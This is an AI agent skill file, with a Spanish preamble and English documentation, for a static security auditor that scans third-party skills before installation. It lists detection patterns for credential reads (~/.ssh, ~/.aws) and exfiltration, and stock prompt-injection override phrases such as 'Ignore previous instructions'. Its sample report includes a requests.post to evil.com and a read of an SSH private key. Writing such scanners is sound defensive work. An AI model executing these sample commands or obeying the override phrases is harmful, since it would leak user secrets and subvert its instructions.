---
name: "skill-security-auditor"
description: >
  Security audit and vulnerability scanner for AI agent skills before installation.
  Use when: (1) evaluating a skill from an untrusted source, (2) auditing a skill
  directory or git repo URL for malicious code, (3) pre-install security gate for
  Claude Code plugins, OpenClaw skills, or Codex skills, (4) scanning Python scripts
  for dangerous patterns like os.system, eval, subprocess, network exfiltration,
  (5) detecting prompt injection in SKILL.md files, (6) checking dependency supply
  chain risks, (7) verifying file system access stays within skill boundaries.
  Triggers: "audit this skill", "is this skill safe", "scan skill for security",
  "check skill before install", "skill security check", "skill vulnerability scan".
sync: no
---

## Antes de usar esta skill — requisitos (chequeo automático)

Esta skill necesita programas de fondo que no vienen con Claude Code. **Antes de ejecutar el script, verificá con Bash** y, si falta algo, NO muestres el error de terminal: respondé con el mensaje indicado y ofrecé la alternativa.

| Necesita | Cómo verificar | Si falta, respondé |
|---|---|---|
| Python 3 | `command -v python3` | «Para esto hace falta instalar **Python 3 (Herramientas de línea de comandos de Apple)**. Está en tu portal, fase «Herramientas de base».» |
| git (solo para auditar un repositorio por URL) | `command -v git` | «Para auditar directo desde GitHub hace falta **git** (viene con las Herramientas de línea de comandos de Apple). Mientras tanto, descargá la carpeta de la skill y auditala local.» |

El script está junto a este archivo: `scripts/skill_security_auditor.py` (usá la ruta absoluta de la carpeta de esta skill). No necesita librerías extra ni claves. Cuando se le pasa una URL, clona el repositorio en una carpeta temporal para leerlo; no instala nada.

**Para quién es**: cualquier persona que quiera sumar una skill de afuera. Regla de la casa: **ninguna skill externa se instala sin pasar por acá primero** (ver `docs/RECURSOS.md` del catálogo: filtro de 5 preguntas + repositorios de confianza).

**Cómo leer el veredicto (importante — el script es un detector de patrones, no un juez):**
1. Corré el script y **leé cada línea señalada** (`archivo:línea`). Preguntate: ¿esto coincide con lo que la skill dice hacer?
   - Una skill que "genera imágenes con OpenRouter" *tiene* que leer `OPENROUTER_API_KEY` del entorno y hacer un `POST` a openrouter.ai → hallazgo **esperado**, no es exfiltración.
   - Una skill que "corrige textos" y manda algo a una URL desconocida, lee `~/.ssh`, o ejecuta `curl … | bash` → hallazgo **real**.
2. Explicale al usuario en criollo, hallazgo por hallazgo: qué línea, qué hace, si coincide con el propósito.
3. Decisión: hallazgo real → **no se instala** (aunque el veredicto diga WARN). Todos los hallazgos son esperados → se puede instalar aunque diga FAIL, dejando por escrito por qué. Duda → no se instala y se consulta al consultor.
4. Falsos positivos conocidos: el propio script del auditor (contiene los patrones que busca), skills que leen una clave del entorno por diseño (`markitdown` con IA, `generate-image`, `transcribe`), y documentación que menciona "API key" al explicar dónde conseguirla.

Alternativa sin instalar nada: si Python no está, leé vos la carpeta de la skill (SKILL.md y scripts) y aplicá a mano las mismas preguntas: qué hace, qué archivos toca, qué comandos ejecuta, qué claves o accesos pide, y si algo no coincide con lo que dice hacer.

El chequeo completo para el cliente es `bash ~/.claude/plugins/marketplaces/claude-catalogo/scripts/chequeo.sh` (ver `docs/CHEQUEO.md` del catálogo).

# Skill Security Auditor

Scan and audit AI agent skills for security risks before installation. Produces a
clear **PASS / WARN / FAIL** verdict with findings and remediation guidance.

## Quick Start

```bash
# Audit a local skill directory
python3 scripts/skill_security_auditor.py /path/to/skill-name/

# Audit a skill from a git repo
python3 scripts/skill_security_auditor.py https://github.com/user/repo --skill skill-name

# Audit with strict mode (any WARN becomes FAIL)
python3 scripts/skill_security_auditor.py /path/to/skill-name/ --strict

# Output JSON report
python3 scripts/skill_security_auditor.py /path/to/skill-name/ --json
```

## What Gets Scanned

### 1. Code Execution Risks (Python/Bash Scripts)

Scans all `.py`, `.sh`, `.bash`, `.js`, `.ts` files for:

| Category | Patterns Detected | Severity |
|----------|-------------------|----------|
| **Command injection** | `os.system()`, `os.popen()`, `subprocess.call(shell=True)`, backtick execution | 🔴 CRITICAL |
| **Code execution** | `eval()`, `exec()`, `compile()`, `__import__()` | 🔴 CRITICAL |
| **Obfuscation** | base64-encoded payloads, `codecs.decode`, hex-encoded strings, `chr()` chains | 🔴 CRITICAL |
| **Network exfiltration** | `requests.post()`, `urllib.request`, `socket.connect()`, `httpx`, `aiohttp` | 🔴 CRITICAL |
| **Credential harvesting** | reads from `~/.ssh`, `~/.aws`, `~/.config`, env var extraction patterns | 🔴 CRITICAL |
| **File system abuse** | writes outside skill dir, `/etc/`, `~/.bashrc`, `~/.profile`, symlink creation | 🟡 HIGH |
| **Privilege escalation** | `sudo`, `chmod 777`, `setuid`, cron manipulation | 🔴 CRITICAL |
| **Unsafe deserialization** | `pickle.loads()`, `yaml.load()` (without SafeLoader), `marshal.loads()` | 🟡 HIGH |
| **Subprocess (safe)** | `subprocess.run()` with list args, no shell | ⚪ INFO |

### 2. Prompt Injection in SKILL.md

Scans SKILL.md and all `.md` reference files for:

| Pattern | Example | Severity |
|---------|---------|----------|
| **System prompt override** | "Ignore previous instructions", "You are now..." | 🔴 CRITICAL |
| **Role hijacking** | "Act as root", "Pretend you have no restrictions" | 🔴 CRITICAL |
| **Safety bypass** | "Skip safety checks", "Disable content filtering" | 🔴 CRITICAL |
| **Hidden instructions** | Zero-width characters, HTML comments with directives | 🟡 HIGH |
| **Excessive permissions** | "Run any command", "Full filesystem access" | 🟡 HIGH |
| **Data extraction** | "Send contents of", "Upload file to", "POST to" | 🔴 CRITICAL |

### 3. Dependency Supply Chain

For skills with `requirements.txt`, `package.json`, or inline `pip install`:

| Check | What It Does | Severity |
|-------|-------------|----------|
| **Known vulnerabilities** | Cross-reference with PyPI/npm advisory databases | 🔴 CRITICAL |
| **Typosquatting** | Flag packages similar to popular ones (e.g., `reqeusts`) | 🟡 HIGH |
| **Unpinned versions** | Flag `requests>=2.0` vs `requests==2.31.0` | ⚪ INFO |
| **Install commands in code** | `pip install` or `npm install` inside scripts | 🟡 HIGH |
| **Suspicious packages** | Low download count, recent creation, single maintainer | ⚪ INFO |

### 4. File System & Structure

| Check | What It Does | Severity |
|-------|-------------|----------|
| **Boundary violation** | Scripts referencing paths outside skill directory | 🟡 HIGH |
| **Hidden files** | `.env`, dotfiles that shouldn't be in a skill | 🟡 HIGH |
| **Binary files** | Unexpected executables, `.so`, `.dll`, `.exe` | 🔴 CRITICAL |
| **Large files** | Files >1MB that could hide payloads | ⚪ INFO |
| **Symlinks** | Symbolic links pointing outside skill directory | 🔴 CRITICAL |

## Audit Workflow

1. **Run the scanner** on the skill directory or repo URL
2. **Review the report** — findings grouped by severity
3. **Verdict interpretation:**
   - **✅ PASS** — No critical or high findings. Safe to install.
   - **⚠️ WARN** — High/medium findings detected. Review manually before installing.
   - **❌ FAIL** — Critical findings. Do NOT install without remediation.
4. **Remediation** — each finding includes specific fix guidance

## Reading the Report

```
╔══════════════════════════════════════════════╗
║  SKILL SECURITY AUDIT REPORT                ║
║  Skill: example-skill                        ║
║  Verdict: ❌ FAIL                            ║
╠══════════════════════════════════════════════╣
║  🔴 CRITICAL: 2  🟡 HIGH: 1  ⚪ INFO: 3    ║
╚══════════════════════════════════════════════╝

🔴 CRITICAL [CODE-EXEC] scripts/helper.py:42
   Pattern: eval(user_input)
   Risk: Arbitrary code execution from untrusted input
   Fix: Replace eval() with ast.literal_eval() or explicit parsing

🔴 CRITICAL [NET-EXFIL] scripts/analyzer.py:88
   Pattern: requests.post("https://evil.com/collect", data=results)
   Risk: Data exfiltration to external server
   Fix: Remove outbound network calls or verify destination is trusted

🟡 HIGH [FS-BOUNDARY] scripts/scanner.py:15
   Pattern: open(os.path.expanduser("~/.ssh/id_rsa"))
   Risk: Reads SSH private key outside skill scope
   Fix: Remove filesystem access outside skill directory

⚪ INFO [DEPS-UNPIN] requirements.txt:3
   Pattern: requests>=2.0
   Risk: Unpinned dependency may introduce vulnerabilities
   Fix: Pin to specific version: requests==2.31.0
```

## Advanced Usage

### Audit a Skill from Git Before Cloning

```bash
# Clone to temp dir, audit, then clean up
python3 scripts/skill_security_auditor.py https://github.com/user/skill-repo --skill my-skill --cleanup
```

### CI/CD Integration

```yaml
# GitHub Actions step
- name: "audit-skill-security"
  run: |
    python3 skill-security-auditor/scripts/skill_security_auditor.py ./skills/new-skill/ --strict --json > audit.json
    if [ $? -ne 0 ]; then echo "Security audit failed"; exit 1; fi
```

### Batch Audit

```bash
# Audit all skills in a directory
for skill in skills/*/; do
  python3 scripts/skill_security_auditor.py "$skill" --json >> audit-results.jsonl
done
```

## Threat Model Reference

For the complete threat model, detection patterns, and known attack vectors against AI agent skills, see [references/threat-model.md](references/threat-model.md).

## Limitations

- Cannot detect logic bombs or time-delayed payloads with certainty
- Obfuscation detection is pattern-based — a sufficiently creative attacker may bypass it
- Network destination reputation checks require internet access
- Does not execute code — static analysis only (safe but less complete than dynamic analysis)
- Dependency vulnerability checks use local pattern matching, not live CVE databases

When in doubt after an audit, **don't install**. Ask the skill author for clarification.
